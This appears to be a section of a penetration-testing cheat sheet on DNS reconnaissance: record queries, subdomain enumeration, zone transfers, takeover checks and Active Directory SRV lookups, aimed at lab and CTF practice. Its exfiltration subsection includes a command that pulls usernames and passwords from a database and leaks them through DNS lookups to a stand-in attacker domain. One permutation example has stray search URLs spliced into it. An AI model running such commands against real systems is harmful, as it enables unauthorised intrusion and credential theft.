### **DNS Reconnaissance**

**Concept/Goal:** Querying Domain Name System (DNS) servers to resolve names to IPs, discover associated services (mail, specific protocols via SRV), identify authoritative servers, enumerate subdomains, check for misconfigurations (like zone transfers), and map the target's DNS infrastructure. This is fundamental for expanding the attack surface and understanding the target environment.

**Key Tools:**

  * **CLI Query Tools:** `dig`, `host`, `nslookup`
  * **Enumeration Frameworks:** `dnsrecon`, `fierce`, `dnsenum`
  * **Passive Enumerators:** `amass`, `subfinder`, `assetfinder`, `sublist3r`, `theHarvester` 🔗 [See Section X.Y: Subdomain Enumeration (Passive)]
  * **Bruteforce Tools:** `gobuster` (dns mode), `ffuf` (for vhost fuzzing finding subdomains), `nmap` (dns-brute script)
  * **Permutation Generators:** `dnsgen`, `gotator`
  * **Mass Resolvers:** `massdns`
  * **Takeover Checkers:** `subjack`, `tko-subs`, `dnsReaper`
  * **Network Scanners:** `nmap`
  * **Packet Analyzers:** `tcpdump`
  * **AD Specific:** `adidnsdump`

**Core Techniques / Workflow:**

#### Basic DNS Queries (dig, host)

  * **Default Query (A Record):**
    💻 `dig $DOMAIN`
    💻 `host $DOMAIN`
  * **Specific Record Types (IPv4, IPv6, Mail, Nameserver, Text, Alias, Authority):**
    💻 `dig $DOMAIN A` 💡 Check primary IPv4 address.
    💻 `dig $DOMAIN AAAA` 💡 Check for IPv6 presence.
    💻 `dig $DOMAIN MX` 💡 Identify mail servers; useful for phishing/spoofing context.
    💻 `dig $DOMAIN NS` 💡 Identify authoritative nameservers; targets for AXFR.
    💻 `dig $DOMAIN TXT` 💡 Look for SPF, DKIM, DMARC, verification codes, potential info leaks.
    💻 `dig $DOMAIN CNAME` 💡 Identify aliases; useful for tracking services or takeover checks.
    💻 `dig $DOMAIN SOA` 💡 Get zone admin info (often obfuscated email), serial number (infrequent changes?), primary NS.
    💻 `dig $DOMAIN ANY` ⚠️ Often blocked/incomplete; prefer specific type queries.
  * **Concise Output:**
    💻 `dig $DOMAIN +short` (A record)
    💻 `dig $DOMAIN MX +short`
    💻 `dig $DOMAIN NS +short`
  * **Reverse DNS Lookup (PTR - IP to Hostname):**
    💻 `dig -x $TARGET_IP +short`
    💻 `host $TARGET_IP`
  * **Targeting Specific DNS Server:** 💡 Essential for querying internal resolvers or authoritative servers directly.
    💻 `dig @$DNS_SERVER $DOMAIN MX`
    💻 `dig -x $TARGET_IP @$TARGET_NS`
    💻 `host $DOMAIN $TARGET_NS`
  * **Tracing Resolution Path:**
    💻 `dig +trace $DOMAIN` 💡 Debug DNS issues or understand delegation.
  * **Filtering Output:**
    💻 `dig +noall +answer $DOMAIN` 💡 Show only the answer section.
    💻 `dig mx $DOMAIN | grep "MX" | grep -v ";"` 💡 Clean MX record output via shell.
  * **Host Tool Variations:**
    💻 `host -t a $DOMAIN`
    💻 `host -t ns $DOMAIN`
    💻 `host -t mx $DOMAIN`
    💻 `host -t aaaa $DOMAIN`
  * **Compare Public Resolvers:**
    💻 `for r in 1.1.1.1 8.8.8.8 9.9.9.9; do echo "== $r =="; dig @$r $TARGET A +short; done | tee dns_diff.txt` 💡 Check for DNS inconsistencies or split-horizon DNS.

#### Passive Subdomain Enumeration

  * **Leverage Certificate Transparency (crt.sh):**
    💻 `curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u` 💡 Excellent source for subdomains with TLS certs, including potentially non-public ones.
  * **Use Aggregator Tools:** (Requires API keys for best results) 🔗 [See Section X.Y: Subdomain Enumeration (Passive)]
    💻 `amass enum -d $DOMAIN -passive`
    💻 `subfinder -d $DOMAIN` (-all flag requires API keys)
    💻 `assetfinder --subs-only $DOMAIN` (Fewer sources, no keys needed by default)
    💻 `sublist3r -d $DOMAIN`
  * **Query Specific APIs:**
    💻 `curl -s "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" | cut -d',' -f1`
    💻 `curl -s "https://rapiddns.io/subdomain/$DOMAIN?full=1" | grep -oP '<td>\K[^<]*' | grep -v "=\|www" | sort -u`

#### Active Subdomain Enumeration (Bruteforce)

  * 💡 Use quality wordlists (e.g., SecLists `Discovery/DNS`). 🎯 A primary method in HTB/THM for finding hidden dev/staging/admin subdomains.
  * **Gobuster DNS Mode:**
    💻 `gobuster dns -d $DOMAIN -w /path/to/subdomains.txt -t 50 -o gobuster_subs.txt`
  * **dnsrecon Bruteforce:**
    💻 `dnsrecon -d $DOMAIN -t brt -D /path/to/subdomains.txt`
  * **fierce (Includes bruteforce):**
    💻 `fierce -dns $DOMAIN --wordlist /path/to/subdomains.txt`
  * **ffuf (HTTP-based VHost Fuzzing):** 💡 Finds subdomains by checking if web servers respond differently. Requires a known webserver IP.
    💻 `ffuf -w /path/to/subdomains.txt -u http://$WEBSERVER_IP -H "Host: FUZZ.$DOMAIN" -fs <size_to_filter>`
  * **Nmap Script:**
    💻 `nmap --script dns-brute --script-args dns-brute.domain=$DOMAIN,dns-brute.hostlist=/path/to/subdomains.txt $TARGET_NS`

#### Subdomain Validation & Filtering

  * **Basic Host Check:**
    💻 `host $subdomain.$DOMAIN | grep "has address"`
  * **Filter List for Resolving Subdomains:**
    💻 `for i in $(cat subdomainlist.txt); do host $i.$DOMAIN | grep "has address" | grep "$DOMAIN" | cut -d" " -f1,4; done`

#### Subdomain Permutation & Resolution

  * 💡 Generate variations of known subdomains (e.g., dev.target.com -\> https://www.google.com/search?q=dev-uat.target.com, https://www.google.com/search?q=dev01.target.com). Useful for finding predictable naming schemes.
  * **dnsgen + massdns:**
    💻 `dnsgen known_subdomains.txt | massdns -r resolvers.txt -t A -o S -w permuted_resolved.txt` (Requires `resolvers.txt` with valid DNS resolver IPs)
  * **Gotator:**
    💻 `gotator -sub known_subdomains.txt -perm permutations.txt -depth 1 -numbers 10 -mindup -adv -md > potential_subdomains.txt` (Requires `permutations.txt` with patterns like `dev-`, `test-`, etc.)

#### DNS Zone Transfer (AXFR)

  * 💡 Attempts to get a full copy of the zone file from an authoritative nameserver. ⚠️ **Rarely successful** against properly configured external servers but *highly valuable* if it works (reveals all records). Always try against identified NS servers. 🎯 Common misconfiguration check in CTFs.
  * **Using dig:**
    💻 `dig axfr @$TARGET_NS $DOMAIN`
  * **Using host:**
    💻 `host -l $DOMAIN $TARGET_NS`
  * **Using dnsrecon:**
    💻 `dnsrecon -d $DOMAIN -t axfr`
  * **Using Nmap:**
    💻 `nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=$DOMAIN $TARGET_NS`

#### DNS Service Scanning (Nmap)

  * **Port Scan (UDP/TCP):**
    💻 `nmap -p 53 -sU -sT $TARGET_NS`
  * **Version Scan (UDP):**
    💻 `nmap -p 53 -sU -sV $TARGET_NS`
  * **NSID Query (Identify Server Software/Version - UDP):**
    💻 `nmap -p 53 -sU --script dns-nsid $TARGET_NS` 💡 Can help find vulnerable DNS server versions.

#### Subdomain Takeover Detection

  * 💡 Checks if subdomains point (via CNAME) to external services (S3, Heroku, GitHub Pages, etc.) but the corresponding resource on the external service doesn't exist or isn't claimed. An attacker can then claim it to host malicious content under the target's domain. 🎯 Frequent vulnerability in HTB/THM web challenges.
  * **Manual CNAME Check (Example for S3):**
    💻 `host -t CNAME $subdomain.$DOMAIN` (Check if it points to an external service)
    💻 `if host $subdomain.$DOMAIN | grep -q "alias for" && host $subdomain.$DOMAIN | grep -q "s3.amazonaws.com"; then echo "Potential S3 Takeover on $subdomain.$DOMAIN"; fi`
  * **Automated Tools:**
    💻 `subjack -w potential_subdomains.txt -t 100 -timeout 30 -o takeover_results.txt -ssl`
    💻 `tko-subs -domains domains_to_check.txt`
    💻 `dnsReaper scan -d $DOMAIN --check-takeover`

#### Active Directory Specific DNS

  * 💡 AD heavily relies on SRV records to locate services. Querying these is crucial during internal AD enumeration. Target the Domain Controller (DC) as the DNS server.
  * **Find LDAP Servers:**
    💻 `dig @$DC_IP SRV _ldap._tcp.dc._msdcs.$DOMAIN`
  * **Find Kerberos Servers (TCP/UDP):**
    💻 `dig @$DC_IP SRV _kerberos._tcp.dc._msdcs.$DOMAIN`
    💻 `dig @$DC_IP SRV _kerberos._udp.$DOMAIN`
  * **Find Global Catalog Servers:**
    💻 `dig @$DC_IP SRV _gc._tcp.dc._msdcs.$DOMAIN`
  * **Find Kerberos Password Change Servers:**
    💻 `dig @$DC_IP SRV _kpasswd._tcp.$DOMAIN`
    💻 `dig @$DC_IP SRV _kpasswd._udp.$DOMAIN`
  * **Dump AD Integrated DNS Zone:** (Requires domain credentials)
    💻 `adidnsdump -u '$DOMAIN\$USER' -p '$PASSWORD' $DC_IP` 💡 Provides a comprehensive list of internal hosts known to AD DNS.

#### DNS Traffic Monitoring & Exfiltration

  * **Capture DNS Traffic:**
    💻 `tcpdump -i any port 53 -l -A` 💡 Monitor local DNS queries or sniff traffic on a compromised host. Add `-n` to disable name resolution.
    💻 `tcpdump -ln -i tun0 port 53 -A 2>/dev/null | grep -E -o "([0-9A-Za-z][0-9A-Za-z\-]*\.)+[0-9A-Za-z][0-9A-Za-z\-]*"` (Capture on tun0, extract domains)
  * **DNS Exfiltration Example (⚠️ Use Ethically & Legally\!):** 💡 Technique to leak data via crafted DNS queries to an attacker-controlled server. Very noisy if not careful.
    💻 `mysql -h $TARGET_DB -u root -p'$PASSWORD' -e "SELECT CONCAT(username, '.', password, '.your.exfil.domain.com') FROM users;" | grep -v username | xargs -I{} ping -c 1 {}` (⚠️ Simplified example; real exfil often encodes data and uses tools like `dnscat2`).

#### Combined Workflows

  * **Subfinder -\> Nuclei Exposure Scan:**
    💻 `subfinder -d $DOMAIN -all -silent | httpx -silent | nuclei -t exposures/ -o nuclei_exposures.txt` 💡 Passively find subdomains, check if they host web servers, then scan for known exposures/misconfigurations with Nuclei templates.
  * **Multi-Record Enum:**
    💻 `for domain in $(cat domains.txt); do (dig +short A $domain @$NS; dig +short AAAA $domain @$NS; ...) | sort -u > $domain-records.txt; done` 💡 Script querying multiple record types for a list of domains against a specific nameserver.

-----
